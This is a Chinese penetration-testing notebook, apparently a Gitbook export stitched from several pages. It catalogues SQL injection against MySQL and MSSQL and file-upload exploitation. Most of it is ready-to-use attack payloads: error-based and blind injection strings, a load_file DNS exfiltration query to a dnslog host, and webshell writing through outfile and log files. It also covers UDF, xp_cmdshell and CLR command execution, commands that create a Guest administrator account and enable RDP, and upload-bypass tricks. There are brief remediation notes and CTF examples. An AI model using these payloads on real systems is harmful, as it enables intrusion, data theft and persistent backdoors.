使用mysql_error()函数，可以返回上一个Mysql操作产生的文本错误信息。 > Access denied for user 'wrong_user'@'localhost' (using password: YES) 报错函数 最常用的 # Xpat语法错误，报错信息是有长度限制的，最大长度限制32位,配合substr()等截取字符串函数使用 select extractvalue(1,concat(0x7e,(select user()),0x7e)); select updatexml(1,concat(0x7e,(select user()),0x7e),1); 其他MySQL报错注入 payload 原型： ?id=1\"or(updatexml(1,concat(0x7e,(),0x7e),1))--+ 爆库: ?id=1\"or(updatexml(1,concat(0x7e,(select(substr(group_concat(schema_name),1,32))from (information_schema.schemata)),0x7e),1))--+ 爆表： id=1\"or(updatexml(1,concat(0x7e,(select(substr(group_concat(table_name),1,32))from (information_schema.tables)where(table_schema='已知库名')),0x7e),1))--+ 爆列名： id=1\"or(updatexml(1,concat(0x7e,(select( substr(group_concat(column_name),1,32)))from(information_schema.columns)where(table_name='flag'))),1))--+ 爆字段值 id=1\"or(updatexml(1,concat(0x7e,(select( substr(group_concat(real_flag_1s_here),1,6)))from(users))),1))--+ 二次注入--存储型注入 原理 常见转义函数 addslashes() mysql_escape_string() 以sql-labs Less-24为例 创建用户 $username= mysql_escape_string($_POST['username']) ; $pass= mysql_escape_string($_POST['password']); $re_pass= mysql_escape_string($_POST['re_password']); $sql = \"insert into users ( username, password) values(\\\"$username\\\", \\\"$pass\\\")\"; 使用不恰当的函数mysql_escape_string，功能为在 MySQL 中具有特殊含义的字符（如单引号、双引号、反斜杠和空字节）前添加反斜杠字符。所以脏数据还是进入到了数据库中。 修改密码处 $sql = \"UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' \"; 直接将脏数据取出并拼接到sql语句中，造成了sql注入。 常见场景 将保存的脏数据从数据库中取出，再次进行sql操作的场景。 修改密码，修改订单等修改已保存信息的地方 注册用户名处 例题 [CISCN2019 华北赛区 Day1 Web5]CyberPunk $address = addslashes($_POST[\"address\"]);#可控变量 $sql = \"insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)\";#将$_POST[\"address\"]保存到数据库中 $row = $fetch->fetch_assoc();#$row保存sql语句查询结果 $sql = \"update `user` set `address`='\".$address.\"', `old_address`='\".$row['address'].\"' where `user_id`=\".$row['user_id'];#调用了查询结果 分析上面两条语句，对可控参数address只进行了转义处理，就保存到数据库中。 并且在update中引用了$row['address']，所以在这里存在二次注入。 可以看到列名为old_address，在进行修改时，会将旧地址保存下来，所以我们只要在第一次修改时，在address处注入恶意代码，第二次修改查询旧地址时就会执行恶意代码。 payload 1' where user_id=updatexml(1,concat(0x7e,(select substr(load_file('/flag.txt'),1,20)),0x7e),1)# 盲注--无回显注入 布尔盲注 页面无数据回显，但是有两种返回状态，poc如下 ?id=1' and 1=1 --+ # True ?id=1' and 1=2 --+ # False payload ?id=1' and 1=子查询 --+ # 子查询=字符串截取+比较 逻辑连接符 payload 或 or ，\\ \\ 异或 xor，^ 按位与/或 &，\\ 字符串截取 # 从start位置开始,截取len个字符 substr(string,start,len) mid(string,start,len) # 从左/右截取len个字符 left(string,len) right(string,len) 比较 like binary 0x25{}{}25 因为大小写不敏感，所以要用binary BINARY将16进制转化为字符串 语法 like 正则 _ . % .* [] [] regexp \"^a\" regexp \"^ab\" 时间盲注 时间盲注就是在布尔盲注上加了延迟时间函数sleep(),用在True和False回显难以区分时,通过页面的响应时间来判断布尔逻辑的正确与否。 payload if(布尔,A,B)与三目运算符逻辑一样,加上sleep函数 sleep(if(布尔,A,B))布尔正确,延迟A秒,布尔错误,延迟B秒 或者 if(布尔,1,sleep(x))布尔正确,无延迟,布尔错误,延迟x秒 其他能造成延时效果的语句 # 通过执行多次命令形成延时 benchmark(执行次数,sql语句) # 查询一些数据量比较大的表做笛卡尔集运算，导致查询缓慢 select * from tab1 cross join tab2; select * from tab1,tab2; DNS外带注入 原理 MySQL Load_File()函数可以发起请求，使用Dnslog接收请求，获取数据； windows下存在UNC路径 UNC是一种命名惯例, 主要用于在Microsoft Windows上指定和映射网络驱动器. UNC命名惯例最多被应用于在局域网中访问文件服务器或者打印机。 \\\\xxxx\\xx 使用条件 windows系统 secure_file_priv为空 payload union select 1,2,load_file(CONCAT('\\\\\\\\',(SELECT hex(passwd) FROM users WHERE username='admin' LIMIT 1),'.mysql.2fzz61.dnslog.cn\\\\abc')) -- Hex编码的目的是减少干扰，域名有一定的规范，有些特殊字符不能带入 -- \\\\\\\\转义 → \\\\ SMB外带注入 http://www.moonslow.com/article/smb_sql_injection 宽字节注入 原理 宽字节：如果一个字符的大小是两个字节的，该字符称为宽字节字符 PHP与Mysql之间的交互 将php的sql语句以character_set_client编码（也就是转为16进制数），再将16进制数以character_set_connection进行编码（也就是转换为url编码），然后以内部操作字符集进行url解码，最后以character_set_results编码输出结果。 %df%27 浏览器url自动解码===> β' 转义===>β\\'转为16进制===> 0xdf0x5c0x27 转换为url编码===> %df%5c%27 进行url解码(因为是GBK编码，%df和%5c结合为汉字)===> 運' 简单的说就是通过宽字节吃掉转义符，逃逸出单引号来进行闭合 例题 sql-lab less-32 转义字符 设置编码集 sql语句，单引号闭合 ?id=1%27 ?id=1%df%27 payload ?id=1%df' 使用 Linux 自带的 iconv 命令进行 UTF 的编码转换 echo \\'|iconv -f utf-8 -t utf-16 echo \\'|iconv -f utf-8 -t utf-32 ?id=1�' order by 注入 https://www.cnblogs.com/1ink/p/15107674.html 知道列名的前提下使用 ?order=if(表达式,id,username) 不知道列名 ?order=if(表达式,1,(select id from information_schema.tables)) Getshell 写文件 条件 高权限 select user, file_priv from mysql.user; 知道网站的绝对路径 secure_fil_priv select @@secure_file_priv; show global variables like '%secure_file_priv%'; # show语句要堆叠注入和回显 payload 基于联合查询 select *from users where id=1 union select 1,'',3 into outfile 'C:\\info.php'; select *from users where id=1 union select 1,'',3 into dumpfile 'C:\\info2.php'; outfile和dumpfile的区别 outfile导出数据支持多行，dumpfile只支持一行 outfile会对数据进行转义，dumpfile不会 所以使用into dumpfile这个函数来写入二进制文件 非联合查询 select *from users where id=1 into outfile 'C:\\info.php' fields terminated by ''; select *from users where id=1 into outfile 'C:\\info2.php' lines terminated by ''; 写入日志文件 # --查看配置，日志是否开启，和mysql默认log地址(记下原地址方便恢复) show variables like '%general%'; set global general_log = on; set global general_log_file = 'e:\\info.php'; # 这里日志创建权限要低一些，不能在c盘创建 select ''; --结束后，痕迹清理 日志慢查询 From：https://wiki.wgpsec.org/knowledge/web/mysql-write-shell.html 为什么要用慢查询写呢？因为开启日志监测后文件会很大，网站访问量大的话我们写的shell会出错 show variables like '%slow_query_log%'; --查看慢查询信息 set global slow_query_log=1; --启用慢查询日志(默认禁用) set global slow_query_log_file='C:\\\\phpStudy\\\\WWW\\\\shell.php'; --修改日志文件路径 show global variables like '%long_query_time%'; --查看默认时间值，当sql语句执行时间超过该值才会被计入日志中，默认10秒 select '' or sleep(@@long_query_time+1); --写shell到慢查询日志 sqlmap --os-shell 大致流程 获取目标信息→使用lines terminated by将具有文件上传的🐎上传到网站→逐级目录访问找到🐎 →通过该🐎上传真正的命令🐎→测试命令🐎能否执行→删除上传的两个🐎 文件上传🐎：form表单 php命令马：获得disable_function，遍历所有代码执行，命令执行函数，判断哪一个不在disable_function。 读取文件 load_file 注意：转义字符 select load_file('e:\\test.txt'); # \\t 错误路径 select load_file('e:\\\\test.txt');# 正确 select load_file(0x653A5C746573742E747874);# 支持十六进制 select load_file(char(101,58,92,116,101,115,116,46,116,120,116));# 支持char函数 load data create table user(cmd text) load data infile 'e:/test.txt' into table user; select * from user; mysqldump--数据库导出时的RCE shell下执行 mysqldump -uroot -proot --all-databases > file_path # 导出所有数据库 mysqldump -uroot -proot --databases db1 --tables a1 a2 > /file_path # 导出db1中的a1、a2表 导出的文本内容 创建数据库判断语句-删除表-创建表-锁表-禁用索引-插入数据-启用索引-解锁表 例题 CISCN2023初赛--dumpit 关键代码 $black = ';`*#^$&|'; #黑名单 $db=$_GET['db']; $t2d=$_GET['table_2_dump']; $randstr = md5(time()); $dump='mariadb-dump '.$db.' '.$t2d.' >./log/'.$randstr.'.log'; system($dump); db和table都可控，过滤不严谨，并且直接拼接到命令中，造成RCE payload ?db=ctf&table_2_dump=flag2 %0d%0a 命令 提权 UDF提权 UDF（User Define Function）自定义函数，是数据库功能的一种扩展。用户通过自定义函数可以实现在 MySQL 中无法方便实现的功能，其添加的新函数都可以在 SQL 语句中调用，就像调用本机函数 version () 等方便。 UDF制作：Mysql_UDF_BackDoor开发实践 - 程序代码学习(Learning Program) - T00ls | 低调求发展 - 潜心习安全 UDF提权流程 工具：tools/大马/udf.php at master · echohun/tools (github.com) # 找到mysql的插件目录(安装目录下的lib/plugin/) show variables like '%plugin%'; # 返回插件目录 select @@basedir; # 返回安装目录 # 写入动态链接库 sqlmap写入 手动十六进制写入 # 创建自定义函数并调用命令 CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.dll'; # 创建sys_eval函数 select sys_eval('whoami'); # 执行whoami命令 # 删除自定义函数 drop function sys_eval; MOF提权 Windows Server 2003 C:/Windows/system32/wbem/mof/ 目录下的 mof 文件每 隔一段时间（几秒钟左右）都会被系统执行 Mysql绕过补充 通用绕过 大小写绕过 修复：正则/i 双写绕过（waf将关键字替换为空，且次数为1） uniunionon 修复：正则/m 注释符绕过 # 手动闭合 $sql=\"select * from users where id='$id';\" $id=1' and '1'='2 select * from users where id='1' and '1'='2'; 空格绕过 %0a %0d%0a /**/ 括号绕过 在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。 引号绕过 不让用单引号 可以用十六进制代替 where(table_name='users') → where(table_name=0x7573657273) 转义了单引号 宽字节注入，二次注入 字符串连接函数 concat(\"str1\", \",\" ,\"str2\") concat_ws(\",\" , \"str1\" , \"str2\") group_concat(\"str1\", \",\" ,\"str2\") select绕过 已知表名可以用handle 版本>=8.0 mysql 8.0.21以上版本的新特性 在对当前表的列名注入时，可以直接写字段名，而无需select 该字段 from 该表 逗号绕过 substr(databse(),1,1) 等价于 substr(databse() from 1 for 1) select 1,2,3; 等价于 select * from (select 1)a join (select 2)b join (select 3)c; 内联注释 # 如果加了!就会执行在/* */内的语句 /*!union select 1,2*/ # 要将整个语句写入/* */内 /*!union select */1,2 这是错误的 # version 5.7.26 /*!00000 select 1,2*/; 可以 /*!50726 select 1,2*/; 可以 /*!50727 select 1,2*/; 不可以 00000 到 50726之间是可以的 无列名注入 场景 information_schem被过滤，不知道表的字段名 解决方法 通过select 数字将字段名设置为数字 再用联合查询将需要的数据存到上图的表中 那么想要查询users表中的username字段的值 select `2` from (select 1,2,3 union select * from user)别名; # 别名是(select 1,2 union select * from user)返回的表的别名 # 如果反引号被过滤 select group_concat(b) from (select 1,2 as b,3 union select * from users)a; 预编译问题 预编译失效 PHP-PDO采用本地预处理 传入?username='admin',查看日志如下 开启永久日志,在配置文件中加入 general_log = 1 general_log_file = 日志路径 可以看到预编译为其自动添加了一对引号，并将用户输入的引号进行转义。 那么如果将表名，order by xx处进行预编译就会产生如下效果 可以看到这些语句\"失效了\"（没有得到想要的结果），所以在实际开发中，对于这些语句大概率就是进行一个拼接处理，就很可能存在sql注入。 预编译使用错误 ThinkPHP5 SQL注入漏洞 && PDO真/伪预处理分析 | 离别歌 堆叠注入 $id= $_GET['id']; # 预处理语句 $stmt = $conn->prepare(\"select * from users where id=$id\"); $stmt->execute(); $fraction = $stmt->fetch(); print_r($fraction); 使用模拟预编译，并且没有绑定参数 又因为PDO默认可以支持多条SQL执行，所有造成了堆叠注入。 ?id=1;create database pdo; 漏洞修复 正确使用预编译+黑名单 配置问题 站库分离 不允许外连 数据库以低权限运行 不显示报错 不使用多语句查询 secure_file_priv=NULL 字符集保持一致 参考文章 Dnslog在SQL注入中的实战-安全客 - 安全资讯平台 https://cloud.tencent.com/developer/article/1938545 奇安信攻防社区-SQL注入&预编译 PDO场景下的SQL注入探究 - 先知社区 Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-25 23:20:43 "},"01.渗透测试/02.Web安全/01.Sql注入/SqlServer/Web安全之Sqlserver注入.html":{"url":"01.渗透测试/02.Web安全/01.Sql注入/SqlServer/Web安全之Sqlserver注入.html","title":"Sql注入--MSSQL","keywords":"","body":"MSSQL_SQL_BYPASS_WIKI/1.2.MSSQL信息收集.md at master · aleenzz/MSSQL_SQL_BYPASS_WIKI https://github.com/aleenzz/MSSQL_SQL_BYPASS_WIKI/blob/master/1.2.MSSQL%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86.md 环境搭建 cn_windows_server_2008_r2_standard_enterprise_datacenter_and_web_with_sp1_x64_dvd_617598.iso 补丁：kb4474419 # 打了才能装vmtools 服务器管理器添加角色IIS 记得勾选.net开发 IIS管理器添加网站，开启父路径 Sqlserver 2008 https://download.microsoft.com/download/9/4/8/948966AB-52CA-40F1-8051-0216481065E6/SQLEXPR_x64_CHS.exe 密码：SA123@ C:\\Windows\\SysWOW64\\SQLServerManager10 开启TCP/IP https://github.com/Larryxi/MSSQL-SQLi-Labs 创建数据库test 修改数据库配置文件 基础 系统数据库 master ：master数据库控制SQL Server的所有方面。这个数据库中包括所有的配置信息、用户登录信息、当前正在服务器中运行的过程的信息。 model：SQL Server为用户数据库提供的样板，新的用户数据库都以model数据库为基础 msdb ：由 Enterprise Manager和Agent使用，记录着任务计划信息、事件处理信息、数据备份及恢复信息、警告及异常信息。 tempdb ：它为临时表和其他临时工作提供了一个存储区。例如，排序时要用到tempdb数据库。数据被放进tempdb数据库，排完序后再把结果返回给用户。每次SQL Server重新启动，它都会清空tempdb数据库并重建。永远不要在tempdb数据库建立需要永久保存的表。 权限 sa（SysAdmin）权限：数据库操作，文件管理，命令执行，注册表读取等system。SQLServer数据库的最高权限 db（Database_owner）权限：文件管理，数据库操作等权限 users-administrators public权限：数据库操作 guest-users 注释符 -- /**/ 变量和函数 @@VERSION @@servername -- 服务器名 host_name() -- 主机名 -- 判断站库分离 host_name()==@@servername db_name() -- 当前数据库 db_name(num) -- 遍历其他数据库 user user_name() is_member('db_owner') -- 判断是否是db_owner权限 is_srvrolemember('sysadmin') -- 判断是否是SA权限 is_srvrolemember('public') -- 判断是否是public权限 数据表 master..sysdatabases -- 存放所有数据库 master..sysobjects -- 存放所有数据表 -- 字段名为name select name from master..sysobjects where xtype='U' -- 查询用户自建表 [dbname].information_schema.columns -- db的所有字段 字段名table_name,column_name [dbname].information_schema.tables -- db的所有表 字段名table_name 注入手段 报错注入 利用显示或隐式转换来报错注入 select * from admin where id =1 (select CAST(USER as int)) select * from admin where id =1 (select convert(int,user)) 【SQL注入】详解基于MSSQL “order by”语句报错的SQL注入技术 – 绿盟科技技术博客 https://blog.nsfocus.net/mssql-order-by/ 联合注入 判断字段 查找回显 爆库 ?id=-1' union select 1,2,db_name(num)-- 爆表 ?id=-1' union select top 1 1,2,name from [dbname]..sysobjects where xtype='u' -- ?id=-1' union select top 1 1,2,name from [dbname]..sysobjects where xtype='u' and name!='[第一条获得的表名]' -- ?id=-1' union select top 1 1,2,name from [dbname]..sysobjects where xtype='u' and name not in ([前面的表]) -- 爆字段 ?id=-1' union select top 1 1,2, COLUMN_NAME from test.information_schema.columns where TABLE_NAME='users' -- ?id=-1' union select top 1 1,2, COLUMN_NAME from test.information_schema.columns where TABLE_NAME='users' and COLUMN_NAME and COLUMN_NAME!='id' -- ?id=-1' union select top 1 1,2, COLUMN_NAME from test.information_schema.columns where TABLE_NAME='users' and COLUMN_NAME not in ('id','username') -- 爆字段值 ```mssql ?id=-1' union select top 1 1,2, COLUMN_NAME from 'users' -- ?id=-1' union select top 1 1,2,username from users where username!='Dumb'-- ?id=-1' union select top 1 1,2,username from users where username not in ('Dumb','Angelina')-- ## 堆叠注入 默认开启 ## 时间盲注 ```mssql if(xxx) waitfor delay '0:0:2' 0:0:2 小时:分钟:秒 GetShell 绝对路径🔍 xp_dirtree 是一个存储过程（stored procedure），它是 Microsoft SQL Server 数据库引擎提供的一个内置过程。该过程可用于执行文件系统目录树扫描操作。 使用 xp_dirtree 存储过程，可以指定一个文件路径，然后执行递归扫描该路径下的所有文件和文件夹，并将结果以表格形式返回给用户 execute master..xp_dirtree 'c:' //列出所有c:\\文件和目录,子目录 execute master..xp_dirtree 'c:',1 //只列c:\\文件夹 execute master..xp_dirtree 'c:',1,1 //列c:\\文件夹加文件 CREATE TABLE tmp (dir varchar(8000),num int,num1 int); insert into tmp(dir,num,num1) execute master..xp_dirtree 'c:',1,1 CREATE TABLE cmdtmp (dir varchar(8000)); insert into cmdtmp(dir) exec master..xp_cmdshell 'for /r c:\\ %i in (1*.aspx) do @echo %i' SA权限 xp_cmdshell 是否开启 select count(*) FROM master..sysobjects Where xtype = 'X' AND name = 'xp_cmdshell' 返回值为1 → 开启 强制开启 -- 将该选项的值设置为1 execute('sp_configure \"show advanced options\",1') -- 保存设置 execute('reconfigure') -- 将xp_cmdshell的值设置为1 execute('sp_configure \"xp_cmdshell\", 1') -- 保存设置 execute('reconfigure') 恢复被删除的xp_cmdshell 下载：https://cn.dll-files.com/xplog70.dll.html Exec master.dbo.sp_addextendedproc 'xp_cmdshell','D:\\\\xplog70.dll' 命令执行--有回显（返回命令结果） execute('xp_cmdshell \"whoami\"') 获得主机权限 版本问题？？ exec xp_cmdshell 'net user Guest 123456' --给guest用户设置密码 exec xp_cmdshell 'net user Guest /active:yes' --激活guest用户 exec xp_cmdshell 'net localgroup administrators Guest /add' --将guest用户添加到administrators用户组 exec xp_cmdshell 'REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f' --开启3389端口 sp_oacreate 是否开启 select count(*) from master.dbo.sysobjects where xtype='x' and name='SP_OACREATE' 返回值为1 → 开启 强制开启 EXEC sp_configure 'show advanced options', 1; RECONFIGURE WITH OVERRIDE; EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE WITH OVERRIDE; 命令执行--无回显（不返回命令结果） declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\\windows\\system32\\cmd.exe /c whoami > e:\\\\test2.txt' CLR功能 CLR（公共语言运行时）提供了 .NET Framework 的代码执行环境，可以通过 .NET Framework 来编写存储过程、触发器等功能 。简单说，通过 CLR 能够在 SQLServer 中注册一套程序集，实现执行任意的 .NET 代码。既然可以执行代码，此时就可以实现很多功能。 使用：https://github.com/mindspoof/MSSQL-Fileless-Rootkit-WarSQLKit --启用MSSQL CLR功能 exec sp_configure 'show advanced options', 1; RECONFIGURE; Exec sp_configure 'clr enabled', 1; RECONFIGURE; --为了导入了不安全的程序集，我们还需要将数据库标记为安全。 ALTER DATABASE [master] SET TRUSTWORTHY ON; --导入程序集，单独执行 xxx --创建存储过程,单独执行 CREATE PROCEDURE sp_cmdExec @Command [nvarchar](4000) WITH EXECUTE AS CALLER AS EXTERNAL NAME WarSQLKit.StoredProcedures.CmdExec; --执行命令 EXEC sp_cmdExec 'whoami'; --删除该程序集 DROP PROCEDURE sp_cmdExec;DROP ASSEMBLY [WarSQLKit]; db_owner权限 LOG备份 存在数据库备份文件 网站的绝对路径 堆叠注入 alter database 数据库名 set RECOVERY FULL; --修改数据库恢复模式为 完整模式 create table cmd (a image); --创建一张表cmd，只有一个列 a，类型为image backup log 数据库名 to disk= 'C:\\phpstudy\\WWW\\1.php' with init; --备份表到指定路径 insert into cmd (a) values(木马十六进制); --插入一句话到cmd表里 backup log 数据库名 to disk='C:\\phpstudy\\WWW\\2.php'; --把操作日志备份到指定文件 drop table cmd; --删除cmd表 2.php为木马文件 差异备份 注：差异备份有概率会把网站搞崩，所以不建议使用差异备份 网站的绝对路径 堆叠注入 create table [dbo].[test] ([cmd] [image]) declare @a sysname,@s nvarchar(4000) select @a=db_name(),@s=0x6b 68617a backup log @a to disk = @s with init,no_truncate insert into [test](cmd) values(木马十六进制) declare @a sysname,@s nvarchar(4000) select @a=db_name(),@s=绝对路径十六进制 backup log @a to disk=@s with init,no_truncate Drop table [test] 补充--待学习 MSSQL 2017--Python和R脚本 沙盒命令执行 Agent Job命令执行 https://xz.aliyun.com/t/7534#toc-17 MSSQL GetShell方法 - 先知社区 mssql 提权总结 - 跳跳糖 (tttang.com) 实战问题记录 语法报错 实际上是sql基础不行，u_lastactive字段类型为日期类型，后面的值跟的是字符串类型，所以会报错，换一个字符串类型的字段或者进行类型转换即可 类型转换 如何分页查询 目的 SqlServer(mssql) Mysql 取第m条到第n条记录 select top (n-m+1) name from users where name not in (select top m-1 name from users) select name from users limit m, n 使用模糊查询，重点是提取可浮动的值 如何去重 distinct Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-21 18:50:12 "},"01.渗透测试/02.Web安全/01.Sql注入/配合其他.html":{"url":"01.渗透测试/02.Web安全/01.Sql注入/配合其他.html","title":"配合其他","keywords":"","body":"允许上传的文件后缀保存在数据库中的表中，表名类似于allow，config，setting等，可以通过sql注入找到对应的表添加脚本后缀，然后就可以上传脚本文件了 文件下载功能是通过uid进行映射，通过修改uid对应的物理路径从而达到任意文件下载漏洞 Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-28 17:27:31 "},"01.渗透测试/02.Web安全/02.文件操作/文件上传/01.漏洞了解.html":{"url":"01.渗透测试/02.Web安全/02.文件操作/文件上传/01.漏洞了解.html","title":"01.漏洞了解","keywords":"","body":"漏洞原理 程序员未对上传的文件进行严格的验证和过滤，而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。这种攻击方式是最为直接和有效的，“文件上传”本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重的后果。 漏洞危害 Webshell类：脚本文件 XSS类：svg，html，pdf文件，文件名注入xss代码 如果pdf支持预览，可以尝试注入iframe标签进行SSRF攻击 XXE类：docx，xlsx，xls，svg，xml RCE类 phar反序列化 # 图片处理 Imagetragick组件漏洞 ImageMagick组件漏洞 SSTI类：tpl 目录穿越：文件路径可控 后果：文件覆盖，ssh公钥，计划任务，脚本文件上传到可执行web目录下.... ffmpeg 任意文件读取漏洞 / SSRF 漏洞 https://www.freebuf.com/articles/web/258320.html https://github.com/neex/ffmpeg-avi-m3u-xbin 压缩包 Linux软链接 ```shell 任意文件读取 ln -s /etc/passwd test zip -y passwd.zip test # -y 保证解压出来的还是软链接 # 创建一个软链接指向网站目录 ln -s /var/www/html test zip -y 1.zip test # 创建一个与软链接同名的目录，并在该目录下创建木马文件 mkdir a && cd a mkdir test echo '' > test/shell.php chmod 777 test/shell.php zip -r 2.zip test 然后先上传1.zip，解压得到软链接test，再上传2.zip，解压得到test目录和shell.php，因为test指向/var/www/html,所以shell.php实际上是被解压到网站目录下 ``` Zip Slip目录穿越漏洞 所有已发现受Zip Slip影响的项目:https://github.com/snyk/zip-slip-vulnerability 注：如果用的是命令unzip来解压，这种方法就没用了，因为unzip 默认跳过文件名中的../ 漏洞修复 关键 后缀名白名单机制 上传的文件统一放到一个地方，遵循以下原则目录可写但不可解析，可解析但不可写入，或者上传到专门用来保存文件的地方，如存储OSS 可用 文件内容校验和过滤 避免条件竞争，先判断是否合法，而不是先将文件写入再判断是否合法 上传文件重命名 隐藏上传文件路径 Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-28 18:56:03 "},"01.渗透测试/02.Web安全/02.文件操作/文件上传/02.黑名单绕过.html":{"url":"01.渗透测试/02.Web安全/02.文件操作/文件上传/02.黑名单绕过.html","title":"02.黑名单绕过","keywords":"","body":"中间件配置不当，导致可以解析其他脚本后缀 # php .php3 .php4 .php5 .pht .phtml .phar .shtml # .shtml # jsp .jsp .jspa .jsps .jspx # .net .asp .asa .cdx .cer .aspx .asmx .ashx 可以上传相关配置文件 .htaccess CTF.htaccess的使用技巧总结_.htaccess ctf_Y4tacker的博客-CSDN博客 只能用于Apache # 当文件名中包含shell时，该文件会被Apache当作php解析 SetHandler application/x-httpd-php #.png文件也可以执行php程序 AddType application/x-httpd-php .png # 开启了cgi扩展：扩展名为.yyy的文件作为 CGI 脚本来处理 Options +ExecCGI AddHandler cgi-script .yyy 修复 在配置文件中将AllowOverride ALL改为AllowOverride None .user.ini 使用条件 Apache和Nginx都可以，只需满足： 服务器脚本语言为PHP 服务器使用CGI FastCGI模式 上传目录下要有可执行的php文件 payload auto_prepend_file=file_name #表示在加载第一个PHP代码之前先行预加载该配置所指示的PHP文件。 auto_append_file=file_name #表示在加载第一个PHP代码之后执行预加载该配置所指示的PHP文件。 过滤不当 点绕过、空格绕过、后缀双写绕过、后缀大小写绕过 Apache解析漏洞 从右往左解析漏洞 产生原因： 前提：php作为apache的一个子模块来运行 apache支持一个文件拥有多个后缀，并为不同后缀执行不同的指令，如果运维人员给.php 后缀增加了处理器 AddHandler application/x-httpd-php .php Apache会从右向左，依次识别后缀，直到遇到自己能解析的文件名为止。那么，在有多个后缀的情况下，只要一个文件含有.php 后缀的文件即将被识别成 PHP 文件。 假设上传的文件名为 xxxx.php.xyz 这时候最后一个可识别的扩展为.php，会将其作为php文件进行解析，轻松绕过黑白名单。 vulhub复现 ![image-20230617172318530](../../../../images/image-20230617172318530.png) 本地cgi模式复现 HTTPD换行解析漏洞--CVE-2017-15715 产生原因： 配置中的正则缺陷 SetHandler application/x-httpd-php 正则表达式中$不仅匹配字符串结尾位置，也可以匹配\\n 或 \\r，从而导致可以上传.php\\n绕过黑名单校验，同时也可以被作为PHP文件解析。（不能是.php\\r\\n） payload 上传：1.php\\x0a 访问：1.php%0a 上述漏洞修复：因为Apache的解析漏洞是由于畸形扩展名和畸形文件名导致的，所以使用白名单，并对文件重命名，文件就不会存在畸形字符和多扩展名的情况。 参考如下代码 Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-28 18:40:40 "},"01.渗透测试/02.Web安全/02.文件操作/文件上传/03.白名单绕过.html":{"url":"01.渗透测试/02.Web安全/02.文件操作/文件上传/03.白名单绕过.html","title":"03.白名单绕过","keywords":"","body":"%00截断 条件 php版本 magic_quotes_gpc关闭 保存的文件名可控 原理 if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } 后端使用move_uploaded_file来移动文件，move_uploaded_file函数底层为c语言，遇到0x00会截断（字符串结束标志） Demo $img_path = $_GET['save_path'].\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_ext; move_uploaded_file($temp_file,$img_path)) payload ?save_path=../upload/shell.php%00 filename=shell.jpg 解析漏洞 IIS 5.x , 6.0 # 文件夹解析漏洞 会将 *.asp/目录下的所有文件当成Asp解析 6.0 # 分号截断漏洞 默认会将 *.asp;.jpg 此种格式的文件名，当成Asp解析，原理是服务器默认不解析; 号及其后面的内容，相当于截断。 修复方案：IIS服务器本身缺陷，升级版本/打补丁 Nginx 文件类型错误解析漏洞（IIS7.x版本在Fast-CGI运行模式下也存在） 产生原因： FastCGI与PHP对PATH_INFO处理的差异。 # payload 上传图片，访问路径/图片路径/.php 修复： 在php.ini中设置fix_pathinfo=0 或者设置security.limit_extensions = .php 或者 在nginx的配置文件中设置fastcgi_spilt_path_info ^(.+\\.php)(.*)$; 空字节解析漏洞（CVE-2013-4547） 受影响版本：0.841~1.4.3/1.5.0~1.5.7 产生原因： nginx配置不当 location ~ \\.php$ { } 当用户请求info.jpg%00.php时，因为info.jpg%00.php能够匹配正则\".php$\"，所以可以进入该location块。 但是nginx在解析文件名时被%00截断，导致以为请求的文件是info.jpg并发给fastcgi，所以fastcgi就将info.jpg当作php文件进行解析了。 # payload 上传文件：info.jpg 请求文件：info.jpg%00.php 修复：升级版本 PHP 配合文件包含 图片🐎 # 绕过宽高检查 #define width 1 #define height 1 https://github.com/huntergregal/PNG-IDAT-Payload-Generator 用数据量小的图片，比如随便截一张很小的图 普通：copy,直接插入 二次渲染：找到前后图片中没有发生变化的hex数据，替换为木马 文件包含trick 配合文件读取反序列化 上传任意后缀的phar格式的文件，配合文件读取用phar://解析 Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-28 18:41:16 "},"01.渗透测试/02.Web安全/02.文件操作/文件上传/04.WebShell上传.html":{"url":"01.渗透测试/02.Web安全/02.文件操作/文件上传/04.WebShell上传.html","title":"04.WebShell上传","keywords":"","body":"文件路径寻找 From https://www.cnblogs.com/yokan/p/15252077.html 因为传上去的文件，如图片这类的总归是显示出来的，所以可以先在web应用到处点点，多加载一些数据包，然后再到burp的http history搜索shell的名字 返回了一些参数但不包括路径的情况，比如file_id 等等，那么文件路径可能存储在数据库中，可以结合sql注入 sqlmap的--search -C参数找到字段和值 什么都没返回的情况，只返回了ok，true等等。重新加载，抓包看响应，或许某个接口的响应就包括对应的路径。 比如头像位置上传上去了，但是没有返回路径，那么想办法让他在加载一遍，比如退出重新登陆，一个包一个包的放。可能有些包的响应中就包含路径。 另外可能存在其他服务器、或者其他站点的其他路径，也是抓包查看，看一下加载过程的路径在哪或者看一下html、js [ 尝试访问日志文件，看能否发现一些敏感目录或上传目录 只返回了文件名，没有路径 一种是fuzz，看其他同类型文件的路径，f12或者如果有文件下载的地方，下载抓包，看文件地址。 另一种是 尝试上传的时候目录穿越，一次一次尝试，看能否穿到站点根目录或者知道的目录下面。修改表单的其他参数、或者filename参数的值 WebShell不解析 表现：访问时文件直接下载 尝试目录穿越，跳到可以执行脚本语言的目录 ///../../../ 以///开头是因为可能会转码，导致写入失败 上传后存在安全设备被删 